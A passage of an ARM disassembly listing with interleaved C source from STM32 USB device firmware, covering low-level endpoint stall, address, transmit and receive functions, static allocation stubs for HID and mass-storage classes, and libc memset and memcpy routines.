 800ccc0:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc2:	e002      	b.n	800ccca <USBD_LL_StallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800ccc4:	2303      	movs	r3, #3
 800ccc6:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc8:	bf00      	nop
  }
  return usb_status;
 800ccca:	7bfb      	ldrb	r3, [r7, #15]
}
 800cccc:	4618      	mov	r0, r3
 800ccce:	3710      	adds	r7, #16
 800ccd0:	46bd      	mov	sp, r7
 800ccd2:	bd80      	pop	{r7, pc}

0800ccd4 <USBD_LL_ClearStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_ClearStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800ccd4:	b580      	push	{r7, lr}
 800ccd6:	b084      	sub	sp, #16
 800ccd8:	af00      	add	r7, sp, #0
 800ccda:	6078      	str	r0, [r7, #4]
 800ccdc:	460b      	mov	r3, r1
 800ccde:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cce0:	2300      	movs	r3, #0
 800cce2:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cce4:	2300      	movs	r3, #0
 800cce6:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_ClrStall(pdev->pData, ep_addr);
 800cce8:	687b      	ldr	r3, [r7, #4]
 800ccea:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800ccee:	78fa      	ldrb	r2, [r7, #3]
 800ccf0:	4611      	mov	r1, r2
 800ccf2:	4618      	mov	r0, r3
 800ccf4:	f7f5 fba6 	bl	8002444 <HAL_PCD_EP_ClrStall>
 800ccf8:	4603      	mov	r3, r0
 800ccfa:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800ccfc:	7bbb      	ldrb	r3, [r7, #14]
 800ccfe:	2b03      	cmp	r3, #3
 800cd00:	d816      	bhi.n	800cd30 <USBD_LL_ClearStallEP+0x5c>
 800cd02:	a201      	add	r2, pc, #4	; (adr r2, 800cd08 <USBD_LL_ClearStallEP+0x34>)
 800cd04:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd08:	0800cd19 	.word	0x0800cd19
 800cd0c:	0800cd1f 	.word	0x0800cd1f
 800cd10:	0800cd25 	.word	0x0800cd25
 800cd14:	0800cd2b 	.word	0x0800cd2b
    case HAL_OK :
      usb_status = USBD_OK;
 800cd18:	2300      	movs	r3, #0
 800cd1a:	73fb      	strb	r3, [r7, #15]
    break;
 800cd1c:	e00b      	b.n	800cd36 <USBD_LL_ClearStallEP+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd1e:	2303      	movs	r3, #3
 800cd20:	73fb      	strb	r3, [r7, #15]
    break;
 800cd22:	e008      	b.n	800cd36 <USBD_LL_ClearStallEP+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd24:	2301      	movs	r3, #1
 800cd26:	73fb      	strb	r3, [r7, #15]
    break;
 800cd28:	e005      	b.n	800cd36 <USBD_LL_ClearStallEP+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cd2a:	2303      	movs	r3, #3
 800cd2c:	73fb      	strb	r3, [r7, #15]
    break;
 800cd2e:	e002      	b.n	800cd36 <USBD_LL_ClearStallEP+0x62>
    default :
      usb_status = USBD_FAIL;
 800cd30:	2303      	movs	r3, #3
 800cd32:	73fb      	strb	r3, [r7, #15]
    break;
 800cd34:	bf00      	nop
  }
  return usb_status;
 800cd36:	7bfb      	ldrb	r3, [r7, #15]
}
 800cd38:	4618      	mov	r0, r3
 800cd3a:	3710      	adds	r7, #16
 800cd3c:	46bd      	mov	sp, r7
 800cd3e:	bd80      	pop	{r7, pc}

0800cd40 <USBD_LL_IsStallEP>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Stall (1: Yes, 0: No)
  */
uint8_t USBD_LL_IsStallEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cd40:	b480      	push	{r7}
 800cd42:	b085      	sub	sp, #20
 800cd44:	af00      	add	r7, sp, #0
 800cd46:	6078      	str	r0, [r7, #4]
 800cd48:	460b      	mov	r3, r1
 800cd4a:	70fb      	strb	r3, [r7, #3]
  PCD_HandleTypeDef *hpcd = (PCD_HandleTypeDef*) pdev->pData;
 800cd4c:	687b      	ldr	r3, [r7, #4]
 800cd4e:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cd52:	60fb      	str	r3, [r7, #12]

  if((ep_addr & 0x80) == 0x80)
 800cd54:	f997 3003 	ldrsb.w	r3, [r7, #3]
 800cd58:	2b00      	cmp	r3, #0
 800cd5a:	da0c      	bge.n	800cd76 <USBD_LL_IsStallEP+0x36>
  {
    return hpcd->IN_ep[ep_addr & 0x7F].is_stall;
 800cd5c:	78fb      	ldrb	r3, [r7, #3]
 800cd5e:	f003 037f 	and.w	r3, r3, #127	; 0x7f
 800cd62:	68f9      	ldr	r1, [r7, #12]
 800cd64:	1c5a      	adds	r2, r3, #1
 800cd66:	4613      	mov	r3, r2
 800cd68:	009b      	lsls	r3, r3, #2
 800cd6a:	4413      	add	r3, r2
 800cd6c:	00db      	lsls	r3, r3, #3
 800cd6e:	440b      	add	r3, r1
 800cd70:	3302      	adds	r3, #2
 800cd72:	781b      	ldrb	r3, [r3, #0]
 800cd74:	e00b      	b.n	800cd8e <USBD_LL_IsStallEP+0x4e>
  }
  else
  {
    return hpcd->OUT_ep[ep_addr & 0x7F].is_stall;
 800cd76:	78fb      	ldrb	r3, [r7, #3]
 800cd78:	f003 027f 	and.w	r2, r3, #127	; 0x7f
 800cd7c:	68f9      	ldr	r1, [r7, #12]
 800cd7e:	4613      	mov	r3, r2
 800cd80:	009b      	lsls	r3, r3, #2
 800cd82:	4413      	add	r3, r2
 800cd84:	00db      	lsls	r3, r3, #3
 800cd86:	440b      	add	r3, r1
 800cd88:	f503 73b5 	add.w	r3, r3, #362	; 0x16a
 800cd8c:	781b      	ldrb	r3, [r3, #0]
  }
}
 800cd8e:	4618      	mov	r0, r3
 800cd90:	3714      	adds	r7, #20
 800cd92:	46bd      	mov	sp, r7
 800cd94:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cd98:	4770      	bx	lr
	...

0800cd9c <USBD_LL_SetUSBAddress>:
  * @param  pdev: Device handle
  * @param  dev_addr: Device address
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_SetUSBAddress(USBD_HandleTypeDef *pdev, uint8_t dev_addr)
{
 800cd9c:	b580      	push	{r7, lr}
 800cd9e:	b084      	sub	sp, #16
 800cda0:	af00      	add	r7, sp, #0
 800cda2:	6078      	str	r0, [r7, #4]
 800cda4:	460b      	mov	r3, r1
 800cda6:	70fb      	strb	r3, [r7, #3]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cda8:	2300      	movs	r3, #0
 800cdaa:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cdac:	2300      	movs	r3, #0
 800cdae:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_SetAddress(pdev->pData, dev_addr);
 800cdb0:	687b      	ldr	r3, [r7, #4]
 800cdb2:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cdb6:	78fa      	ldrb	r2, [r7, #3]
 800cdb8:	4611      	mov	r1, r2
 800cdba:	4618      	mov	r0, r3
 800cdbc:	f7f5 f97f 	bl	80020be <HAL_PCD_SetAddress>
 800cdc0:	4603      	mov	r3, r0
 800cdc2:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cdc4:	7bbb      	ldrb	r3, [r7, #14]
 800cdc6:	2b03      	cmp	r3, #3
 800cdc8:	d816      	bhi.n	800cdf8 <USBD_LL_SetUSBAddress+0x5c>
 800cdca:	a201      	add	r2, pc, #4	; (adr r2, 800cdd0 <USBD_LL_SetUSBAddress+0x34>)
 800cdcc:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cdd0:	0800cde1 	.word	0x0800cde1
 800cdd4:	0800cde7 	.word	0x0800cde7
 800cdd8:	0800cded 	.word	0x0800cded
 800cddc:	0800cdf3 	.word	0x0800cdf3
    case HAL_OK :
      usb_status = USBD_OK;
 800cde0:	2300      	movs	r3, #0
 800cde2:	73fb      	strb	r3, [r7, #15]
    break;
 800cde4:	e00b      	b.n	800cdfe <USBD_LL_SetUSBAddress+0x62>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cde6:	2303      	movs	r3, #3
 800cde8:	73fb      	strb	r3, [r7, #15]
    break;
 800cdea:	e008      	b.n	800cdfe <USBD_LL_SetUSBAddress+0x62>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cdec:	2301      	movs	r3, #1
 800cdee:	73fb      	strb	r3, [r7, #15]
    break;
 800cdf0:	e005      	b.n	800cdfe <USBD_LL_SetUSBAddress+0x62>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800cdf2:	2303      	movs	r3, #3
 800cdf4:	73fb      	strb	r3, [r7, #15]
    break;
 800cdf6:	e002      	b.n	800cdfe <USBD_LL_SetUSBAddress+0x62>
    default :
      usb_status = USBD_FAIL;
 800cdf8:	2303      	movs	r3, #3
 800cdfa:	73fb      	strb	r3, [r7, #15]
    break;
 800cdfc:	bf00      	nop
  }
  return usb_status;
 800cdfe:	7bfb      	ldrb	r3, [r7, #15]
}
 800ce00:	4618      	mov	r0, r3
 800ce02:	3710      	adds	r7, #16
 800ce04:	46bd      	mov	sp, r7
 800ce06:	bd80      	pop	{r7, pc}

0800ce08 <USBD_LL_Transmit>:
  * @param  pbuf: Pointer to data to be sent
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Transmit(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce08:	b580      	push	{r7, lr}
 800ce0a:	b086      	sub	sp, #24
 800ce0c:	af00      	add	r7, sp, #0
 800ce0e:	60f8      	str	r0, [r7, #12]
 800ce10:	607a      	str	r2, [r7, #4]
 800ce12:	603b      	str	r3, [r7, #0]
 800ce14:	460b      	mov	r3, r1
 800ce16:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce18:	2300      	movs	r3, #0
 800ce1a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce1c:	2300      	movs	r3, #0
 800ce1e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Transmit(pdev->pData, ep_addr, pbuf, size);
 800ce20:	68fb      	ldr	r3, [r7, #12]
 800ce22:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce26:	7af9      	ldrb	r1, [r7, #11]
 800ce28:	683b      	ldr	r3, [r7, #0]
 800ce2a:	687a      	ldr	r2, [r7, #4]
 800ce2c:	f7f5 fa5a 	bl	80022e4 <HAL_PCD_EP_Transmit>
 800ce30:	4603      	mov	r3, r0
 800ce32:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800ce34:	7dbb      	ldrb	r3, [r7, #22]
 800ce36:	2b03      	cmp	r3, #3
 800ce38:	d816      	bhi.n	800ce68 <USBD_LL_Transmit+0x60>
 800ce3a:	a201      	add	r2, pc, #4	; (adr r2, 800ce40 <USBD_LL_Transmit+0x38>)
 800ce3c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ce40:	0800ce51 	.word	0x0800ce51
 800ce44:	0800ce57 	.word	0x0800ce57
 800ce48:	0800ce5d 	.word	0x0800ce5d
 800ce4c:	0800ce63 	.word	0x0800ce63
    case HAL_OK :
      usb_status = USBD_OK;
 800ce50:	2300      	movs	r3, #0
 800ce52:	75fb      	strb	r3, [r7, #23]
    break;
 800ce54:	e00b      	b.n	800ce6e <USBD_LL_Transmit+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ce56:	2303      	movs	r3, #3
 800ce58:	75fb      	strb	r3, [r7, #23]
    break;
 800ce5a:	e008      	b.n	800ce6e <USBD_LL_Transmit+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ce5c:	2301      	movs	r3, #1
 800ce5e:	75fb      	strb	r3, [r7, #23]
    break;
 800ce60:	e005      	b.n	800ce6e <USBD_LL_Transmit+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ce62:	2303      	movs	r3, #3
 800ce64:	75fb      	strb	r3, [r7, #23]
    break;
 800ce66:	e002      	b.n	800ce6e <USBD_LL_Transmit+0x66>
    default :
      usb_status = USBD_FAIL;
 800ce68:	2303      	movs	r3, #3
 800ce6a:	75fb      	strb	r3, [r7, #23]
    break;
 800ce6c:	bf00      	nop
  }
  return usb_status;
 800ce6e:	7dfb      	ldrb	r3, [r7, #23]
}
 800ce70:	4618      	mov	r0, r3
 800ce72:	3718      	adds	r7, #24
 800ce74:	46bd      	mov	sp, r7
 800ce76:	bd80      	pop	{r7, pc}

0800ce78 <USBD_LL_PrepareReceive>:
  * @param  pbuf: Pointer to data to be received
  * @param  size: Data size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_PrepareReceive(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t *pbuf, uint32_t size)
{
 800ce78:	b580      	push	{r7, lr}
 800ce7a:	b086      	sub	sp, #24
 800ce7c:	af00      	add	r7, sp, #0
 800ce7e:	60f8      	str	r0, [r7, #12]
 800ce80:	607a      	str	r2, [r7, #4]
 800ce82:	603b      	str	r3, [r7, #0]
 800ce84:	460b      	mov	r3, r1
 800ce86:	72fb      	strb	r3, [r7, #11]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ce88:	2300      	movs	r3, #0
 800ce8a:	75bb      	strb	r3, [r7, #22]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ce8c:	2300      	movs	r3, #0
 800ce8e:	75fb      	strb	r3, [r7, #23]

  hal_status = HAL_PCD_EP_Receive(pdev->pData, ep_addr, pbuf, size);
 800ce90:	68fb      	ldr	r3, [r7, #12]
 800ce92:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800ce96:	7af9      	ldrb	r1, [r7, #11]
 800ce98:	683b      	ldr	r3, [r7, #0]
 800ce9a:	687a      	ldr	r2, [r7, #4]
 800ce9c:	f7f5 f9d9 	bl	8002252 <HAL_PCD_EP_Receive>
 800cea0:	4603      	mov	r3, r0
 800cea2:	75bb      	strb	r3, [r7, #22]

  switch (hal_status) {
 800cea4:	7dbb      	ldrb	r3, [r7, #22]
 800cea6:	2b03      	cmp	r3, #3
 800cea8:	d816      	bhi.n	800ced8 <USBD_LL_PrepareReceive+0x60>
 800ceaa:	a201      	add	r2, pc, #4	; (adr r2, 800ceb0 <USBD_LL_PrepareReceive+0x38>)
 800ceac:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ceb0:	0800cec1 	.word	0x0800cec1
 800ceb4:	0800cec7 	.word	0x0800cec7
 800ceb8:	0800cecd 	.word	0x0800cecd
 800cebc:	0800ced3 	.word	0x0800ced3
    case HAL_OK :
      usb_status = USBD_OK;
 800cec0:	2300      	movs	r3, #0
 800cec2:	75fb      	strb	r3, [r7, #23]
    break;
 800cec4:	e00b      	b.n	800cede <USBD_LL_PrepareReceive+0x66>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cec6:	2303      	movs	r3, #3
 800cec8:	75fb      	strb	r3, [r7, #23]
    break;
 800ceca:	e008      	b.n	800cede <USBD_LL_PrepareReceive+0x66>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cecc:	2301      	movs	r3, #1
 800cece:	75fb      	strb	r3, [r7, #23]
    break;
 800ced0:	e005      	b.n	800cede <USBD_LL_PrepareReceive+0x66>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ced2:	2303      	movs	r3, #3
 800ced4:	75fb      	strb	r3, [r7, #23]
    break;
 800ced6:	e002      	b.n	800cede <USBD_LL_PrepareReceive+0x66>
    default :
      usb_status = USBD_FAIL;
 800ced8:	2303      	movs	r3, #3
 800ceda:	75fb      	strb	r3, [r7, #23]
    break;
 800cedc:	bf00      	nop
  }
  return usb_status;
 800cede:	7dfb      	ldrb	r3, [r7, #23]
}
 800cee0:	4618      	mov	r0, r3
 800cee2:	3718      	adds	r7, #24
 800cee4:	46bd      	mov	sp, r7
 800cee6:	bd80      	pop	{r7, pc}

0800cee8 <USBD_LL_GetRxDataSize>:
  * @param  pdev: Device handle
  * @param  ep_addr: Endpoint number
  * @retval Received Data Size
  */
uint32_t USBD_LL_GetRxDataSize(USBD_HandleTypeDef *pdev, uint8_t ep_addr)
{
 800cee8:	b580      	push	{r7, lr}
 800ceea:	b082      	sub	sp, #8
 800ceec:	af00      	add	r7, sp, #0
 800ceee:	6078      	str	r0, [r7, #4]
 800cef0:	460b      	mov	r3, r1
 800cef2:	70fb      	strb	r3, [r7, #3]
  return HAL_PCD_EP_GetRxCount((PCD_HandleTypeDef*) pdev->pData, ep_addr);
 800cef4:	687b      	ldr	r3, [r7, #4]
 800cef6:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cefa:	78fa      	ldrb	r2, [r7, #3]
 800cefc:	4611      	mov	r1, r2
 800cefe:	4618      	mov	r0, r3
 800cf00:	f7f5 f9d8 	bl	80022b4 <HAL_PCD_EP_GetRxCount>
 800cf04:	4603      	mov	r3, r0
}
 800cf06:	4618      	mov	r0, r3
 800cf08:	3708      	adds	r7, #8
 800cf0a:	46bd      	mov	sp, r7
 800cf0c:	bd80      	pop	{r7, pc}
	...

0800cf10 <HAL_PCDEx_LPM_Callback>:
  * @param  hpcd: PCD handle
  * @param  msg: LPM message
  * @retval None
  */
void HAL_PCDEx_LPM_Callback(PCD_HandleTypeDef *hpcd, PCD_LPM_MsgTypeDef msg)
{
 800cf10:	b580      	push	{r7, lr}
 800cf12:	b082      	sub	sp, #8
 800cf14:	af00      	add	r7, sp, #0
 800cf16:	6078      	str	r0, [r7, #4]
 800cf18:	460b      	mov	r3, r1
 800cf1a:	70fb      	strb	r3, [r7, #3]
  switch (msg)
 800cf1c:	78fb      	ldrb	r3, [r7, #3]
 800cf1e:	2b00      	cmp	r3, #0
 800cf20:	d002      	beq.n	800cf28 <HAL_PCDEx_LPM_Callback+0x18>
 800cf22:	2b01      	cmp	r3, #1
 800cf24:	d013      	beq.n	800cf4e <HAL_PCDEx_LPM_Callback+0x3e>
      /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
    }
    break;
  }
}
 800cf26:	e023      	b.n	800cf70 <HAL_PCDEx_LPM_Callback+0x60>
    if (hpcd->Init.low_power_enable)
 800cf28:	687b      	ldr	r3, [r7, #4]
 800cf2a:	699b      	ldr	r3, [r3, #24]
 800cf2c:	2b00      	cmp	r3, #0
 800cf2e:	d007      	beq.n	800cf40 <HAL_PCDEx_LPM_Callback+0x30>
      SystemClockConfig_Resume();
 800cf30:	f000 f84a 	bl	800cfc8 <SystemClockConfig_Resume>
      SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf34:	4b10      	ldr	r3, [pc, #64]	; (800cf78 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf36:	691b      	ldr	r3, [r3, #16]
 800cf38:	4a0f      	ldr	r2, [pc, #60]	; (800cf78 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf3a:	f023 0306 	bic.w	r3, r3, #6
 800cf3e:	6113      	str	r3, [r2, #16]
    USBD_LL_Resume(hpcd->pData);
 800cf40:	687b      	ldr	r3, [r7, #4]
 800cf42:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf46:	4618      	mov	r0, r3
 800cf48:	f7fe fa66 	bl	800b418 <USBD_LL_Resume>
    break;
 800cf4c:	e010      	b.n	800cf70 <HAL_PCDEx_LPM_Callback+0x60>
    USBD_LL_Suspend(hpcd->pData);
 800cf4e:	687b      	ldr	r3, [r7, #4]
 800cf50:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cf54:	4618      	mov	r0, r3
 800cf56:	f7fe fa43 	bl	800b3e0 <USBD_LL_Suspend>
    if (hpcd->Init.low_power_enable)
 800cf5a:	687b      	ldr	r3, [r7, #4]
 800cf5c:	699b      	ldr	r3, [r3, #24]
 800cf5e:	2b00      	cmp	r3, #0
 800cf60:	d005      	beq.n	800cf6e <HAL_PCDEx_LPM_Callback+0x5e>
      SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cf62:	4b05      	ldr	r3, [pc, #20]	; (800cf78 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf64:	691b      	ldr	r3, [r3, #16]
 800cf66:	4a04      	ldr	r2, [pc, #16]	; (800cf78 <HAL_PCDEx_LPM_Callback+0x68>)
 800cf68:	f043 0306 	orr.w	r3, r3, #6
 800cf6c:	6113      	str	r3, [r2, #16]
    break;
 800cf6e:	bf00      	nop
}
 800cf70:	bf00      	nop
 800cf72:	3708      	adds	r7, #8
 800cf74:	46bd      	mov	sp, r7
 800cf76:	bd80      	pop	{r7, pc}
 800cf78:	e000ed00 	.word	0xe000ed00

0800cf7c <USBD_static_malloc>:
  * @brief  Static single allocation.
  * @param  size: Size of allocated memory
  * @retval None
  */
void *USBD_static_malloc(uint32_t size)
{
 800cf7c:	b480      	push	{r7}
 800cf7e:	b083      	sub	sp, #12
 800cf80:	af00      	add	r7, sp, #0
 800cf82:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_CUSTOM_HID_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cf84:	4b03      	ldr	r3, [pc, #12]	; (800cf94 <USBD_static_malloc+0x18>)
}
 800cf86:	4618      	mov	r0, r3
 800cf88:	370c      	adds	r7, #12
 800cf8a:	46bd      	mov	sp, r7
 800cf8c:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cf90:	4770      	bx	lr
 800cf92:	bf00      	nop
 800cf94:	20000e74 	.word	0x20000e74

0800cf98 <USBD_static_malloc_MSC>:

void *USBD_static_malloc_MSC(uint32_t size)
{
 800cf98:	b480      	push	{r7}
 800cf9a:	b083      	sub	sp, #12
 800cf9c:	af00      	add	r7, sp, #0
 800cf9e:	6078      	str	r0, [r7, #4]
  static uint32_t mem[(sizeof(USBD_MSC_BOT_HandleTypeDef)/4+1)];/* On 32-bit boundary */
  return mem;
 800cfa0:	4b03      	ldr	r3, [pc, #12]	; (800cfb0 <USBD_static_malloc_MSC+0x18>)
}
 800cfa2:	4618      	mov	r0, r3
 800cfa4:	370c      	adds	r7, #12
 800cfa6:	46bd      	mov	sp, r7
 800cfa8:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfac:	4770      	bx	lr
 800cfae:	bf00      	nop
 800cfb0:	20000e9c 	.word	0x20000e9c

0800cfb4 <USBD_static_free>:
  * @brief  Dummy memory free
  * @param  p: Pointer to allocated  memory address
  * @retval None
  */
void USBD_static_free(void *p)
{
 800cfb4:	b480      	push	{r7}
 800cfb6:	b083      	sub	sp, #12
 800cfb8:	af00      	add	r7, sp, #0
 800cfba:	6078      	str	r0, [r7, #4]

}
 800cfbc:	bf00      	nop
 800cfbe:	370c      	adds	r7, #12
 800cfc0:	46bd      	mov	sp, r7
 800cfc2:	f85d 7b04 	ldr.w	r7, [sp], #4
 800cfc6:	4770      	bx	lr

0800cfc8 <SystemClockConfig_Resume>:
  * @brief  Configures system clock after wake-up from USB resume callBack:
  *         enable HSI, PLL and select PLL as system clock source.
  * @retval None
  */
static void SystemClockConfig_Resume(void)
{
 800cfc8:	b580      	push	{r7, lr}
 800cfca:	af00      	add	r7, sp, #0
  SystemClock_Config();
 800cfcc:	f7f3 fb26 	bl	800061c <SystemClock_Config>
}
 800cfd0:	bf00      	nop
 800cfd2:	bd80      	pop	{r7, pc}

0800cfd4 <memset>:
 800cfd4:	4402      	add	r2, r0
 800cfd6:	4603      	mov	r3, r0
 800cfd8:	4293      	cmp	r3, r2
 800cfda:	d100      	bne.n	800cfde <memset+0xa>
 800cfdc:	4770      	bx	lr
 800cfde:	f803 1b01 	strb.w	r1, [r3], #1
 800cfe2:	e7f9      	b.n	800cfd8 <memset+0x4>

0800cfe4 <__libc_init_array>:
 800cfe4:	b570      	push	{r4, r5, r6, lr}
 800cfe6:	4d0d      	ldr	r5, [pc, #52]	; (800d01c <__libc_init_array+0x38>)
 800cfe8:	4c0d      	ldr	r4, [pc, #52]	; (800d020 <__libc_init_array+0x3c>)
 800cfea:	1b64      	subs	r4, r4, r5
 800cfec:	10a4      	asrs	r4, r4, #2
 800cfee:	2600      	movs	r6, #0
 800cff0:	42a6      	cmp	r6, r4
 800cff2:	d109      	bne.n	800d008 <__libc_init_array+0x24>
 800cff4:	4d0b      	ldr	r5, [pc, #44]	; (800d024 <__libc_init_array+0x40>)
 800cff6:	4c0c      	ldr	r4, [pc, #48]	; (800d028 <__libc_init_array+0x44>)
 800cff8:	f000 f826 	bl	800d048 <_init>
 800cffc:	1b64      	subs	r4, r4, r5
 800cffe:	10a4      	asrs	r4, r4, #2
 800d000:	2600      	movs	r6, #0
 800d002:	42a6      	cmp	r6, r4
 800d004:	d105      	bne.n	800d012 <__libc_init_array+0x2e>
 800d006:	bd70      	pop	{r4, r5, r6, pc}
 800d008:	f855 3b04 	ldr.w	r3, [r5], #4
 800d00c:	4798      	blx	r3
 800d00e:	3601      	adds	r6, #1
 800d010:	e7ee      	b.n	800cff0 <__libc_init_array+0xc>
 800d012:	f855 3b04 	ldr.w	r3, [r5], #4
 800d016:	4798      	blx	r3
 800d018:	3601      	adds	r6, #1
 800d01a:	e7f2      	b.n	800d002 <__libc_init_array+0x1e>
 800d01c:	0800d20c 	.word	0x0800d20c
 800d020:	0800d20c 	.word	0x0800d20c
 800d024:	0800d20c 	.word	0x0800d20c
 800d028:	0800d210 	.word	0x0800d210

0800d02c <memcpy>:
 800d02c:	440a      	add	r2, r1
 800d02e:	4291      	cmp	r1, r2
 800d030:	f100 33ff 	add.w	r3, r0, #4294967295
 800d034:	d100      	bne.n	800d038 <memcpy+0xc>
 800d036:	4770      	bx	lr
 800d038:	b510      	push	{r4, lr}
 800d03a:	f811 4b01 	ldrb.w	r4, [r1], #1
 800d03e:	f803 4f01 	strb.w	r4, [r3, #1]!
 800d042:	4291      	cmp	r1, r2
 800d044:	d1f9      	bne.n	800d03a <memcpy+0xe>
 800d046:	bd10      	pop	{r4, pc}

0800d048 <_init>:
 800d048:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d04a:	bf00      	nop
 800d04c:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d04e:	bc08      	pop	{r3}
 800d050:	469e      	mov	lr, r3
 800d052:	4770      	bx	lr

0800d054 <_fini>:
 800d054:	b5f8      	push	{r3, r4, r5, r6, r7, lr}
 800d056:	bf00      	nop
 800d058:	bcf8      	pop	{r3, r4, r5, r6, r7}
 800d05a:	bc08      	pop	{r3}
 800d05c:	469e      	mov	lr, r3
 800d05e:	4770      	bx	lr
